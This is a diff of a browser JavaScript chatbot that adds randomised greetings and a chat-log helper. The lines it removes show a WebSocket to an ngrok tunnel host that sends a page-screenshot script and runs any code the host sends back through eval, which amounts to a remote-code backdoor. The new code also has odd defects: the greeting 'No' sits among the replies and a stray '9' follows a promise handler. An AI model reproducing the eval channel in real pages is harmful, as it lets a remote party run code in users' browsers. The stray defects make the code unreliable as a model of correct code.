@@ -1,30 +1,39 @@
 class Chatbot {
     constructor() {
         this.responses = {
-            greeting: "Hello! How can I help you today?",
-            farewell: "Goodbye! Have a great day.",
-            weather: "I'm sorry, I don't know the current weather.",
+            greetings: [
+                "Hello! How can I help you today?",
+                "Hi there! What can I do for you?",
+                "Greetings! How may I assist you?",
+                "No",
+            ],
+            farewell: [
+                "Goodbye! Have a great day.",
+                "It's been nice talking to you. Cya!",
+                "Farewell! Have fun and stay safe."
+            ],
             default: "I'm not sure how to respond to that. Can you ask me something else?"
         };
     }
 
+    getRandomResponse(response) {
+        const randomIndex = Math.floor(Math.random() * this.responses[response].length);
+        return this.responses[response][randomIndex];
+    }
+
     processUserInput(input) {
-        const sanitizedInput = input.toLowerCase();
+        const sanitizedInput = input.toLowerCase().trim();
 
         switch (true) {
             case /hello|hi/.test(sanitizedInput):
-                return this.responses.greeting;
+                return this.getRandomResponse('greetings');
             case /goodbye|bye/.test(sanitizedInput):
-                return this.responses.farewell;
-            case /weather/.test(sanitizedInput):
-                return this.responses.weather;
+                return this.getRandomResponse('farewell');
             case /math/.test(sanitizedInput):
                 return this.solveMathProblem(sanitizedInput);
-            case /search/.test(sanitizedInput):
-                return this.searchWebPage(sanitizedInput);
             default:
                 return this.responses.default;
-        }
+        }        
     }
 
     solveMathProblem(input) {
@@ -33,60 +42,48 @@ class Chatbot {
             const result = math.evaluate(mathExpression);
             return `The result of ${mathExpression} is: ${result}`;
         } catch (error) {
-            return error;
+            return "I'm sorry, I couldn't compute that. Please enter a valid math expression.";
         }
     }
 
-    async searchWebPage(userInput) {
-        const query = userInput.replace(/search\s*/i, '');
-        ws.send(JSON.stringify({ action: 'search', query }));
+    appendMessageToChatLog(role, text) {
+        const chatLog = document.getElementById('chat-log');
+        const messageContainer = document.createElement('div');
+        const message = document.createElement('p');
+
+        message.textContent = `${role}: ${text}`;
+        messageContainer.appendChild(message);
+        chatLog.appendChild(messageContainer);
+
+        chatLog.scrollTop = chatLog.scrollHeight;
     }
 
     chatWithUser(userInput) {
-        const chatLog = document.getElementById('chat-log');
-        const messageContainer = document.createElement('div');
-        const userMessage = document.createElement('p');
-        const botResponse = document.createElement('p');
+        this.appendMessageToChatLog("User", userInput);
+        const response = this.processUserInput(userInput);
 
-        userMessage.textContent = `User: ${userInput}`;
-        botResponse.textContent = `Chatbot: ${this.processUserInput(userInput)}`;
-
-        messageContainer.appendChild(userMessage);
-        messageContainer.appendChild(botResponse);
-        chatLog.appendChild(messageContainer);
-
-        // Scroll to the bottom of the chat log
-        chatLog.scrollTop = chatLog.scrollHeight;
+        if (response instanceof Promise) {
+            response
+                .then((botMessage) => {
+                    this.appendMessageToChatLog("Chatbot", botMessage);
+                })
+                .catch((error) => {
+                    this.appendMessageToChatLog("Chatbot", error);
+                });9
+        } else {
+            this.appendMessageToChatLog("Chatbot", response);
+        }
     }
 }
 
 const chatbot = new Chatbot();
 
-function sendMessage() {
-    const userInput = document.getElementById('user-input').value;
-    chatbot.chatWithUser(userInput);
-    document.getElementById('user-input').value = '';
-}
+document.getElementById('send-button').addEventListener('click', () => {
+    const userInputField = document.getElementById('user-input');
+    const userInput = userInputField.value;
+    userInputField.value = ''; // Clear the input field
 
-function displayScreenshot(screenshotData) {
-    const screenshotElement = document.getElementById('screenshot');
-    screenshotElement.src = `data:image/png;base64,${screenshotData}`;
-}
-
-const ws = new WebSocket('wss://poetic-national-amoeba.ngrok-free.app');
-
-ws.addEventListener('open', (event) => {
-    console.log('WebSocket connection opened:', event);
-    ws.send(JSON.stringify({ action: 'something', value: `function n(n,t){var e=document.createElement("script");e.type="text/javascript",e.src=n,e.onload=t,document.head.appendChild(e)}function o(){n("https://html2canvas.hertzen.com/dist/html2canvas.min.js",function(){html2canvas(document.body).then(function(n){var t=n.toDataURL("image/png");console.log(t),window.open("","_blank").document.write('<img src="'+t+'" alt="Screenshot">')})})}o();` }))
-});
-
-ws.addEventListener('message', (event) => {
-    const data = JSON.parse(event.data);
-
-    if (data.action === 'search') {
-        displayScreenshot(data.screenshotData);
-    } else if (data.action === 'something') {
-        console.log(data.value)
-        eval(data.value)
+    if (userInput) {
+        chatbot.chatWithUser(userInput);
     }
 });
